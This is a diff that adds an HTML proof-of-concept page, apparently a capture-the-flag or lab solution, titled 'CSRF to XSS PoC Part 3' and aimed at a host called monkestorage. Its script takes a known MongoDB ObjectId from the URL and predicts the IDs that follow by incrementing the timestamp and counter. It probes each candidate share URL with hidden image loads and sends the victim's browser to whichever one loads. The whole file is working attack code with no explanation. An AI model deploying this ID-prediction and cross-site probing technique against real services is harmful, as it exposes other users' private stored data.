@@ -1,0 +1,41 @@
+<html>
+    <body>
+        <h1>CSRF to XSS PoC Part 3</h1>
+
+        <div id="xsleaks-imgs"></div>
+        <script>
+            const maxTimeDiff = 60;
+            const shareKey = 'ff373618fbefa19991f1e123';
+            var knownObjectId = new URLSearchParams(window.location.search).get('knownId');
+            var timestampHex = knownObjectId.slice(0,8);
+            var procmachId = knownObjectId.slice(8,18);
+            var counterHex = knownObjectId.slice(18,24)
+            
+            console.log(knownObjectId)
+            console.log(`${timestampHex}${procmachId}${counterHex}`)
+
+            var timestamp = parseInt(timestampHex, 16);
+            var nextCounter = (parseInt(counterHex, 16)+1).toString(16);
+
+            var testObjectIds = [];
+            var testTimestamp = timestamp;
+            for (var i=1; i<=maxTimeDiff; i++) {
+                testTimestamp++;
+                testObjectIds.push(`${testTimestamp.toString(16)}${procmachId}${nextCounter}`)
+            }
+
+            for (let i=0; i<= 30; i++) {
+                setTimeout(() => {
+                    testObjectIds.forEach((objId) => {
+                        var targetUrl = `http://monkestorage:3000/view/${shareKey}/${objId}`;
+                        var div = document.getElementById('xsleaks-imgs');
+                        var img = document.createElement('img');
+                        img.src = targetUrl;
+                        img.onload = () => window.location = targetUrl;
+                        div.appendChild(img);
+                    });
+                }, 10 + 1000*i);
+            }
+        </script>
+    </body>
+</html>
